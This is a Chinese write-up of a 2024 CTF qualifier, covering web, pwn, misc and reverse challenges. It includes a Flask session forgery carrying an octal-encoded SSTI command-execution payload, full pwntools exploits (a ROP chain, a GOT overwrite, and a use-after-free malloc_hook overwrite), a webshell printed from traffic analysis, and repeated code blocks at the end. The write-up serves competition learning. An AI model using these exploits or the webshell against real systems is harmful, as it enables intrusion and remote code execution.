# 2024年第四届“长城杯”网络安全大赛_暨京津冀网络安全技能竞赛（初赛）Writeup

> 原文: https://www.ctfiot.com/204463.html
> ID: 204463

Web

SQLUP

源代码有提示,所以直接%%登录

username=admin&password=%%

然后进入后台可以找到一处文件上传的位置,这里没限制后缀,但是限制不能有p字符

直接上传.htaccess绕过,将1.xxx解析为php

然后直接上传木马 然后tac有sudo权限,直接读flag就好了

CandyShop

给了源码,直接审计一下

import datetime
from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, make_response
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Length
from flask_wtf import FlaskForm
import re

app = Flask(__name__)

app.config['SECRET_KEY'] = 'xxxxxxx'

class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6, max=20)])
    submit = SubmitField('Register')
    
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6, max=20)])
    submit = SubmitField('Login')

class Candy:
    def __init__(self, name, image):
        self.name = name
        self.image = image

class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def verify_password(self, username, password):
        return (self.username==username) & (self.password==password)
class Admin:
    def __init__(self):
        self.username = ""
        self.identity = ""

def sanitize_inventory_sold(value):
    return re.sub(r'[a-zA-Z_]', '', str(value))
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

candies = [Candy(name="Lollipop", image="images/candy1.jpg"),
    Candy(name="Chocolate Bar", image="images/candy2.jpg"),
    Candy(name="Gummy Bears", image="images/candy3.jpg")
]
users = []
admin_user = []
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(username=form.username.data, password=form.password.data)
        users.append(user)
        return redirect(url_for('login'))
    
    return render_template('register.html', form=form)

@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        for u in users:
            if u.verify_password(form.username.data, form.password.data):
                session['username'] = form.username.data
                session['identity'] = "guest"
                return redirect(url_for('home'))
    
    return render_template('login.html', form=form)

inventory = 500
sold = 0
@app.route('/home', methods=['GET', 'POST'])
def home():
    global inventory, sold
    message = None
    username = session.get('username')
    identity = session.get('identity')

    if not username:
        return redirect(url_for('register'))
    
    if sold >= 10 and sold < 500:
        sold = 0
        inventory = 500
        message = "But you have bought too many candies!"
        return render_template('home.html', inventory=inventory, sold=sold, message=message, candies=candies)

    if request.method == 'POST':
        action = request.form.get('action')
        if action == "buy_candy":
            if inventory > 0:
                inventory -= 3
                sold += 3
            if inventory == 0:
                message = "All candies are sold out!"
            if sold >= 500:
                with open('secret.txt', 'r') as file:
                    message = file.read()

    return render_template('home.html', inventory=inventory, sold=sold, message=message, candies=candies)

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    admin = Admin()
    merge(session,admin)
    admin_user.append(admin)
    return render_template('admin.html', view='index')

@app.route('/admin/view_candies', methods=['GET', 'POST'])
def view_candies():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    return render_template('admin.html', view='candies', candies=candies)

@app.route('/admin/add_candy', methods=['GET', 'POST'])
def add_candy():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    candy_name = request.form.get('name')
    candy_image = request.form.get('image')
    if candy_name and candy_image:
        new_candy = Candy(name=candy_name, image=candy_image)
        candies.append(new_candy)
    return render_template('admin.html', view='add_candy')

@app.route('/admin/view_inventory', methods=['GET', 'POST'])
def view_inventory():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    inventory_value = sanitize_inventory_sold(inventory)
    sold_value = sanitize_inventory_sold(sold)
    return render_template_string("商店库存:" + inventory_value + "已售出" + sold_value)

@app.route('/admin/add_inventory', methods=['GET', 'POST'])
def add_inventory():
    global inventory
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    if request.form.get('add'):
        num = request.form.get('add')
        inventory += int(num)
    return render_template('admin.html', view='add_inventory')

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=1337)

做完题总结一下几处比较关键的源码

# 获取flag大致路径的
if request.method == 'POST':
        action = request.form.get('action')
        if action == "buy_candy":
            if inventory > 0:
                inventory -= 3
                sold += 3
            if inventory == 0:
                message = "All candies are sold out!"
            if sold >= 500:
                with open('secret.txt', 'r') as file:
                    message = file.read()

# 造成原型链污染处
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
....
admin = Admin()
merge(session,admin)
....

# SSTI处
def view_inventory():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    inventory_value = sanitize_inventory_sold(inventory)
    sold_value = sanitize_inventory_sold(sold)
    return render_template_string("商店库存:" + inventory_value + "已售出" + sold_value)

# SSTI Waf处
def sanitize_inventory_sold(value):
    return re.sub(r'[a-zA-Z_]', '', str(value))

大致的思路就是,因为这里写的很死,超过10个sold就会重置,所以只能够想着说通过session伪造去获取secret.txt

这里通过密钥爆破获取到key是a123456

然后就可以来伪造session,通过伪造sold超过500获取一下secret.txt的内容

然后可以看到/admin/view_inventory接口是有模板渲染的,就会造成SSTI漏洞,虽然这里限制了不允许字母

但是我们可以参考https://ctftime.org/writeup/22159

来源：SCTF-XCTF 2020 Jsonhub

解题思路主要是bypass SSTI 字母限制

然后再搜索其他师傅的wp：https://igml.top/2020/07/06/2020-SCTF/

就可以锁定是通过八进制来绕过这里的限制,然后再通过flask unsign工具来伪造一下session

开源地址：https://github.com/Paradoxis/Flask-Unsign

flask-unsign --sign --cookie "{'identity': 'admin', 'username': 'test3','__init__':{'__global
s__':{'sold':857,'inventory':'{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051')}}'}}}" --secret 'a123456'

简单执行以下whoami证明方法可行

然后这里直接读上面获取的路径是读不到的

得一层一层ls来看

然后再拼接一下路径

就可以直接读flag了

Pwn

FlowerShop

可以通过溢出修改金钱

分析chunk函数，只需要我们买两朵影星玫瑰和一朵卡布奇诺玫瑰便可以满足溢出条件

程序提供了/bin/sh和system函数，直接溢出构造system("/bin/sh")

exp:

from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

elf = ELF("./pwn")
p = elf.process()
#p = remote("8.147.131.74", 24077)
def debug():
    pause()
    gdb.attach(p)
    sleep(2)

payload_1 = b"A" * (0x40 - 0xc) + b"pwn"  + b"x00" + p32(0xffffff)
p.recvuntil(b":n")
p.send(payload_1)

p.sendlineafter(b":n",b"a")
p.sendlineafter(b":n",b"a")
p.sendlineafter(b"1/0n",b"1")
p.sendlineafter(b":n",b"a")
p.sendlineafter(b"1/0n",b"1")
#debug()
p.sendlineafter(b":n",b"b")
p.sendlineafter(b"1/0n",b"1")
p.sendlineafter(b":n",b"c")

binsh = 0x601840
system = elf.plt["system"]
pop_rdi = 0x0000000000400f13# : pop rdi ; ret
ret = 0x00000000004006f6
payload_1 = b"A" * 0x18 + p64(pop_rdi) + p64(binsh) + p64(ret)  + p64(system)
p.sendlineafter(b"1/0n",payload_1)
p.interactive()

consumption

分析半天了cJSON_Parse源码后面发现和json数据结构差不多

cJSON代码阅读（parse）部分 – 核桃的炼金工坊 (twistoy.cn)

构造好发包数据结构后便可以进行交互了

漏洞点：

这个a3时main函数的v13变量

能够输入的数据超大，而v13和s的栈空间相差0x500字节，所以我们可以通过覆盖v13而达到任意地址写，

将printf_got表地址写入到heap[1]当中，这样show(heap[1])便可以泄露出printf的真实地址

而printf_got和free_got是相邻的，所以通过edit将free修改成system，释放chunk0 便可以getshell

from pwn import *
import json

context.log_level = 'debug'
context.terminal = ["wt.exe","wsl"]

elf = ELF("./pwn")
#p = elf.process()
p = remote("8.147.134.27",38474)
#libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")
libc = ELF("./libc.so.6")
def debug():
    pause()
    gdb.attach(p)
    sleep(2)

def add_heap(size,content):
    p.sendlineafter(b"5.exittn",b'{"choice":"1","idx":0,"size":"' + bytes(str(size),encoding="utf-8") + b'","content":"' + content + b'"}')

def free_heap(idx):
    p.sendlineafter(b"5.exittn",'{"choice":"2","idx":' + str(idx) + ',"size":"","content":""}')

def show_heap(idx):
    p.sendlineafter(b"5.exittn",'{"choice":"3","idx":' + str(idx) + ',"size":"","content":""}')

def edit_heap(idx,content):
    p.sendlineafter(b"5.exittn",b'{"choice":"4","idx":1,"size":"","content":"' + content + b'"}')

#debug()
#pause()

heaplist = 0x08051B10
add_heap(8,b"/bin/sh")

#free_got = elf.got["free"]
printf_got = elf.got["printf"]

payload_1 = b"A" * 0x4cc + p32(heaplist + 4)
add_heap(printf_got,payload_1)
#add_heap(0x8,"AAAA")

show_heap(1)
libc.address = u32(p.recvuntil(b"xf7")[-4:]) - libc.sym["printf"]
log.success("libc.address = " + hex(libc.address))

system = libc.sym["system"]

edit_heap(1,b"A" * 4 + p32(system))

free_heap(0)
#debug()
p.interactive()

Kylin_Heap

漏洞点

存在UAF

思路：

申请一个大堆块使其释放进入unsorted bin，利用打印功能泄露libc，然后利用uaf任意地址申请到malloc_hook，将其覆盖为one_gadget，getshell

exp:

from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

libc = ELF("libc.so.6")
def get_p(file):
    elf = ELF(file)
    #p = elf.process()
    p = remote("8.147.129.22",32449)
    return p,elf

def debug():
    pause()
    gdb.attach(p)
    sleep(2)

p,elf = get_p("./Heap")

'''
def xxx():
    p.sendlineafter()
    p.sendlineafter()
    p.sendlineafter()
'''

def add_heap(size,content):
    p.sendlineafter(b"adventurer? ",b"1")
    p.sendlineafter(b"bytes): ",str(size))
    p.sendlineafter(b"bytes):n",content)

def free_heap(idx):
    p.sendlineafter(b"adventurer? ",b"2")
    p.sendlineafter(b": ",str(idx))

def edit_heap(idx,content):
    p.sendlineafter(b"adventurer? ", b"3")
    p.sendlineafter(b": ",str(idx))
    p.sendlineafter(b":n",content)

def show_heap(idx):
    p.sendlineafter(b"adventurer? ",b"4")
    p.sendlineafter(b": ",str(idx))

add_heap(0x440,b"A")    #chunk 0
add_heap(0x440,b"A")    #chunk 1

free_heap(0)
show_heap(0)

libc.address = u64(p.recvuntil(b"x7f")[-6:].ljust(8,b"x00")) - 0x1ebbe0
log.success("libc =" + hex(libc.address))

malloc_hook = libc.sym["__malloc_hook"]

add_heap(0x10,b"A")  #chunk 2
add_heap(0x10,b'A')  #chunk 3

free_heap(2)
free_heap(3)

edit_heap(3,p64(malloc_hook))

one_gadgets = [0xe6c7e,0xe6c81,0xe6c84]
og = libc.address + one_gadgets[1]

add_heap(0x10,b"A")
add_heap(0x10,p64(og))

p.sendlineafter(b"adventurer? ", b"1")
p.sendlineafter(b"bytes): ", b"10")
p.interactive()

Misc

BrickGame

玩三关小游戏获得flag，也可以直接伪造成功的包，这里我玩游戏过的，结果就是web痛失前三

漏洞探踪，流量解密

给了两个文件夹,一阶段和二阶段

一阶段给了oa.access.log和第一阶段.cap

题目要找ip,直接拷打gpt

然后找到第二阶段压缩密码192.168.30.234

这里翻了一下二阶段的http数据,看到了请求192.168.1.5/key,所以直接筛选一下这个ip,就可以找到raw

get 192.168.1.5/key bdb8e21eace81d5fd21ca445ccb35071

get 192.168.1.5/raw

bdb8e21eace81d5fd21ca445ccb350715a76f6751576dbe1af49328aa1d2d2bea16ef62afa3a7c616dbdb8e21eace81d5fd21ca445ccb35071

仔细观察可以发现前32与后32个字符与 key一样，并且通过前面的提示可以知道这是密文，且使用rc4加密

得到flag

最安全的加密方式

过滤HTTP流

找到上传的一个PHP脚本和一个rar文件

<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='25ming@';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (stripos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

猜测出rar密码为25ming@

得到一串flag密文

8fa14cdd754f91cc6554c9e71929cce7
2db95e8e1a9267b7a1188556b2013b33
0cc175b9c0f1b6a831c399e269772661
b2f5ff47436671b6e533d8dc3614845d
f95b70fdc3088560732a5ac135644506
b9ece18c950afbfa6b0fdbfa4ff731d3
2510c39011c5be704182423e3a695e91
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
6f8f57715090da2632453988d9a1501b
cfcd208495d565ef66e7dff9f98764da
03c7c0ace395d80182db07ae2c30f034
e358efa489f58062f10dd7316b65649e
b14a7b8059d9c055954c92674ce60032
c81e728d9d4c2f636f067f89cc14862c
e1671797c52e15f763380b45e841ec32
4a8a08f09d37b73795649038408b5f33
4c614360da93c0a041b22e537de151eb
4b43b0aee35624cd95b910189b3dc231
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
e1671797c52e15f763380b45e841ec32
8d9c307cb7f3c4a32822a51922d1ceaa
4a8a08f09d37b73795649038408b5f33
4b43b0aee35624cd95b910189b3dc231
57cec4137b614c87cb4e24a3d003a3e0
83878c91171338902e0fe0fb97a8c47a
e358efa489f58062f10dd7316b65649e
865c0c0b4ab0e063e5caa3387c1a8741
d95679752134a2d9eb61dbd7b91c4bcc
7b8b965ad4bca0e41ab51de7b31363a1
9033e0e305f247c0c3c80d0c7848c8b3
9033e0e305f247c0c3c80d0c7848c8b3
9033e0e305f247c0c3c80d0c7848c8b3
cbb184dd8e05c9709e5dcaedaa0495cf

盲猜出题失误，直接爆破单字节md5。

import hashlib
import string

flag = [
    '8fa14cdd754f91cc6554c9e71929cce7',
    '2db95e8e1a9267b7a1188556b2013b33',
    '0cc175b9c0f1b6a831c399e269772661',
    'b2f5ff47436671b6e533d8dc3614845d',
    'f95b70fdc3088560732a5ac135644506',
    'b9ece18c950afbfa6b0fdbfa4ff731d3',
    '2510c39011c5be704182423e3a695e91',
    'e1671797c52e15f763380b45e841ec32',
    'b14a7b8059d9c055954c92674ce60032',
    '6f8f57715090da2632453988d9a1501b',
    'cfcd208495d565ef66e7dff9f98764da',
    '03c7c0ace395d80182db07ae2c30f034',
    'e358efa489f58062f10dd7316b65649e',
    'b14a7b8059d9c055954c92674ce60032',
    'c81e728d9d4c2f636f067f89cc14862c',
    'e1671797c52e15f763380b45e841ec32',
    '4a8a08f09d37b73795649038408b5f33',
    '4c614360da93c0a041b22e537de151eb',
    '4b43b0aee35624cd95b910189b3dc231',
    'e1671797c52e15f763380b45e841ec32',
    'b14a7b8059d9c055954c92674ce60032',
    'e1671797c52e15f763380b45e841ec32',
    '8d9c307cb7f3c4a32822a51922d1ceaa',
    '4a8a08f09d37b73795649038408b5f33',
    '4b43b0aee35624cd95b910189b3dc231',
    '57cec4137b614c87cb4e24a3d003a3e0',
    '83878c91171338902e0fe0fb97a8c47a',
    'e358efa489f58062f10dd7316b65649e',
    '865c0c0b4ab0e063e5caa3387c1a8741',
    'd95679752134a2d9eb61dbd7b91c4bcc',
    '7b8b965ad4bca0e41ab51de7b31363a1',
    '9033e0e305f247c0c3c80d0c7848c8b3',
    '9033e0e305f247c0c3c80d0c7848c8b3',
    '9033e0e305f247c0c3c80d0c7848c8b3',
    'cbb184dd8e05c9709e5dcaedaa0495cf',
]

alphabet = string.ascii_letters + string.digits + string.punctuation
for x in range(len(flag)):
    for i in alphabet:
        en = hashlib.md5(i.encode()).hexdigest()
        if en == flag[x]:
            print(i, end="")

# flag{The_m0st_2ecUre_eNcrYption!!!}

Re

easyre

进来很明显看到了main函数

动调发现是异或的算法，写出逆向流程，gpt分析这两个常量为正确的数据，根据gpt判断解，但是只能写出前33位的，最后10位靠猜。

true_flag = [
    0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 
    0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x0A, 0x0D, 0x06, 0x1C, 
    0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 
    0x05, 0x57, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 
    0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x00, 0x1B, 
    0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 
    0x4F, 0x57, 0x05, 0x54, 0x55, 0x03, 0x53, 0x57, 0x01, 0x03, 
    0x07, 0x04, 0x4A, 0x77, 0x0D
]

tmp = 'f'
for i in range(16):
    next1 = true_flag[16 + i] ^ ord(tmp[-1])
    tmp += chr(next1)

print(tmp)
for i in range(16):
    next1 = true_flag[i] ^ ord(tmp[-1])
    tmp += chr(next1)
print(tmp)

直接把最后十位可能的结果都输出

for x in range(33, len(true_flag)):
    tmp = 'flag{fcf94739-da66-467c-a77f-b50d'
    for i in range(10):
        next1 = true_flag[x + i] ^ ord(tmp[-1])
        tmp += chr(next1)
    print(tmp)

# flag{fcf94739-da66-467c-a77f-b50diosnkn1<?;
# flag{fcf94739-da66-467c-a77f-b50db~cfc<126<
# flag{fcf94739-da66-467c-a77f-b50dxe`e:740:.
# flag{fcf94739-da66-467c-a77f-b50dy|y&+(,&2{
# flag{fcf94739-da66-467c-a77f-b50dad;651;/fc
# flag{fcf94739-da66-467c-a77f-b50da>304>*cf1
# flag{fcf94739-da66-467c-a77f-b50d;651;/fc44
# flag{fcf94739-da66-467c-a77f-b50dijndp9<kkp
# flag{fcf94739-da66-467c-a77f-b50dgci}41ff}d
# flag{fcf94739-da66-467c-a77f-b50d`j~72ee~ge
# flag{fcf94739-da66-467c-a77f-b50dnz36aazca`
# flag{fcf94739-da66-467c-a77f-b50dp9<kkpikj>
# flag{fcf94739-da66-467c-a77f-b50d-(d}~*d
# flag{fcf94739-da66-467c-a77f-b50da66-467c-a
# flag{fcf94739-da66-467c-a77f-b50d33(132f(d2
# flag{fcf94739-da66-467c-a77f-b50ddfde13ee
# flag{fcf94739-da66-467c-a77f-b50dfde13ee4
# flag{fcf94739-da66-467c-a77f-b50d}~*d(~~/d
# flag{fcf94739-da66-467c-a77f-b50dfg3}1gg6}2
# flag{fcf94739-da66-467c-a77f-b50de13ee40g
# flag{fcf94739-da66-467c-a77f-b50d0~2dd5~1fc
# flag{fcf94739-da66-467c-a77f-b50d*f00a*e27c
# flag{fcf94739-da66-467c-a77f-b50d(~~/d+|y-x
# flag{fcf94739-da66-467c-a77f-b50d22c(g05a47
# flag{fcf94739-da66-467c-a77f-b50dd5~1fc7ba2
# flag{fcf94739-da66-467c-a77f-b50d5~1fc7ba2e
# flag{fcf94739-da66-467c-a77f-b50d/`72f30c45
# flag{fcf94739-da66-467c-a77f-b50d+|y-x{(~}
# flag{fcf94739-da66-467c-a77f-b50d36b74g0125
# flag{fcf94739-da66-467c-a77f-b50da5`c0gfebf
# flag{fcf94739-da66-467c-a77f-b50d0ef5bc`gc)
# flag{fcf94739-da66-467c-a77f-b50d12a67437}

一眼锁定最后一个，提交正确。


```
username=admin&password=%%
```



```
import datetime
from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, make_response
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Length
from flask_wtf import FlaskForm
import re

app = Flask(__name__)

app.config['SECRET_KEY'] = 'xxxxxxx'

class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6, max=20)])
    submit = SubmitField('Register')
    
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6, max=20)])
    submit = SubmitField('Login')

class Candy:
    def __init__(self, name, image):
        self.name = name
        self.image = image

class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def verify_password(self, username, password):
        return (self.username==username) & (self.password==password)
class Admin:
    def __init__(self):
        self.username = ""
        self.identity = ""

def sanitize_inventory_sold(value):
    return re.sub(r'[a-zA-Z_]', '', str(value))
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

candies = [Candy(name="Lollipop", image="images/candy1.jpg"),
    Candy(name="Chocolate Bar", image="images/candy2.jpg"),
    Candy(name="Gummy Bears", image="images/candy3.jpg")
]
users = []
admin_user = []
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(username=form.username.data, password=form.password.data)
        users.append(user)
        return redirect(url_for('login'))
    
    return render_template('register.html', form=form)

@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        for u in users:
            if u.verify_password(form.username.data, form.password.data):
                session['username'] = form.username.data
                session['identity'] = "guest"
                return redirect(url_for('home'))
    
    return render_template('login.html', form=form)

inventory = 500
sold = 0
@app.route('/home', methods=['GET', 'POST'])
def home():
    global inventory, sold
    message = None
    username = session.get('username')
    identity = session.get('identity')

    if not username:
        return redirect(url_for('register'))
    
    if sold >= 10 and sold < 500:
        sold = 0
        inventory = 500
        message = "But you have bought too many candies!"
        return render_template('home.html', inventory=inventory, sold=sold, message=message, candies=candies)

    if request.method == 'POST':
        action = request.form.get('action')
        if action == "buy_candy":
            if inventory > 0:
                inventory -= 3
                sold += 3
            if inventory == 0:
                message = "All candies are sold out!"
            if sold >= 500:
                with open('secret.txt', 'r') as file:
                    message = file.read()

    return render_template('home.html', inventory=inventory, sold=sold, message=message, candies=candies)

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    admin = Admin()
    merge(session,admin)
    admin_user.append(admin)
    return render_template('admin.html', view='index')

@app.route('/admin/view_candies', methods=['GET', 'POST'])
def view_candies():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    return render_template('admin.html', view='candies', candies=candies)

@app.route('/admin/add_candy', methods=['GET', 'POST'])
def add_candy():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    candy_name = request.form.get('name')
    candy_image = request.form.get('image')
    if candy_name and candy_image:
        new_candy = Candy(name=candy_name, image=candy_image)
        candies.append(new_candy)
    return render_template('admin.html', view='add_candy')

@app.route('/admin/view_inventory', methods=['GET', 'POST'])
def view_inventory():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    inventory_value = sanitize_inventory_sold(inventory)
    sold_value = sanitize_inventory_sold(sold)
    return render_template_string("商店库存:" + inventory_value + "已售出" + sold_value)

@app.route('/admin/add_inventory', methods=['GET', 'POST'])
def add_inventory():
    global inventory
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    if request.form.get('add'):
        num = request.form.get('add')
        inventory += int(num)
    return render_template('admin.html', view='add_inventory')

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=1337)
```



```
# 获取flag大致路径的
if request.method == 'POST':
        action = request.form.get('action')
        if action == "buy_candy":
            if inventory > 0:
                inventory -= 3
                sold += 3
            if inventory == 0:
                message = "All candies are sold out!"
            if sold >= 500:
                with open('secret.txt', 'r') as file:
                    message = file.read()

# 造成原型链污染处
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
....
admin = Admin()
merge(session,admin)
....

# SSTI处
def view_inventory():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    inventory_value = sanitize_inventory_sold(inventory)
    sold_value = sanitize_inventory_sold(sold)
    return render_template_string("商店库存:" + inventory_value + "已售出" + sold_value)

# SSTI Waf处
def sanitize_inventory_sold(value):
    return re.sub(r'[a-zA-Z_]', '', str(value))
```



```
flask-unsign --sign --cookie "{'identity': 'admin', 'username': 'test3','__init__':{'__global
s__':{'sold':857,'inventory':'{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051')}}'}}}" --secret 'a123456'
```



```
from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

elf = ELF("./pwn")
p = elf.process()
#p = remote("8.147.131.74", 24077)
def debug():
    pause()
    gdb.attach(p)
    sleep(2)

payload_1 = b"A" * (0x40 - 0xc) + b"pwn"  + b"x00" + p32(0xffffff)
p.recvuntil(b":n")
p.send(payload_1)

p.sendlineafter(b":n",b"a")
p.sendlineafter(b":n",b"a")
p.sendlineafter(b"1/0n",b"1")
p.sendlineafter(b":n",b"a")
p.sendlineafter(b"1/0n",b"1")
#debug()
p.sendlineafter(b":n",b"b")
p.sendlineafter(b"1/0n",b"1")
p.sendlineafter(b":n",b"c")

binsh = 0x601840
system = elf.plt["system"]
pop_rdi = 0x0000000000400f13# : pop rdi ; ret
ret = 0x00000000004006f6
payload_1 = b"A" * 0x18 + p64(pop_rdi) + p64(binsh) + p64(ret)  + p64(system)
p.sendlineafter(b"1/0n",payload_1)
p.interactive()
```



```
from pwn import *
import json

context.log_level = 'debug'
context.terminal = ["wt.exe","wsl"]

elf = ELF("./pwn")
#p = elf.process()
p = remote("8.147.134.27",38474)
#libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")
libc = ELF("./libc.so.6")
def debug():
    pause()
    gdb.attach(p)
    sleep(2)

def add_heap(size,content):
    p.sendlineafter(b"5.exittn",b'{"choice":"1","idx":0,"size":"' + bytes(str(size),encoding="utf-8") + b'","content":"' + content + b'"}')

def free_heap(idx):
    p.sendlineafter(b"5.exittn",'{"choice":"2","idx":' + str(idx) + ',"size":"","content":""}')

def show_heap(idx):
    p.sendlineafter(b"5.exittn",'{"choice":"3","idx":' + str(idx) + ',"size":"","content":""}')

def edit_heap(idx,content):
    p.sendlineafter(b"5.exittn",b'{"choice":"4","idx":1,"size":"","content":"' + content + b'"}')

#debug()
#pause()

heaplist = 0x08051B10
add_heap(8,b"/bin/sh")

#free_got = elf.got["free"]
printf_got = elf.got["printf"]

payload_1 = b"A" * 0x4cc + p32(heaplist + 4)
add_heap(printf_got,payload_1)
#add_heap(0x8,"AAAA")

show_heap(1)
libc.address = u32(p.recvuntil(b"xf7")[-4:]) - libc.sym["printf"]
log.success("libc.address = " + hex(libc.address))

system = libc.sym["system"]

edit_heap(1,b"A" * 4 + p32(system))

free_heap(0)
#debug()
p.interactive()
```



```
from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

libc = ELF("libc.so.6")
def get_p(file):
    elf = ELF(file)
    #p = elf.process()
    p = remote("8.147.129.22",32449)
    return p,elf

def debug():
    pause()
    gdb.attach(p)
    sleep(2)

p,elf = get_p("./Heap")

'''
def xxx():
    p.sendlineafter()
    p.sendlineafter()
    p.sendlineafter()
'''

def add_heap(size,content):
    p.sendlineafter(b"adventurer? ",b"1")
    p.sendlineafter(b"bytes): ",str(size))
    p.sendlineafter(b"bytes):n",content)

def free_heap(idx):
    p.sendlineafter(b"adventurer? ",b"2")
    p.sendlineafter(b": ",str(idx))

def edit_heap(idx,content):
    p.sendlineafter(b"adventurer? ", b"3")
    p.sendlineafter(b": ",str(idx))
    p.sendlineafter(b":n",content)

def show_heap(idx):
    p.sendlineafter(b"adventurer? ",b"4")
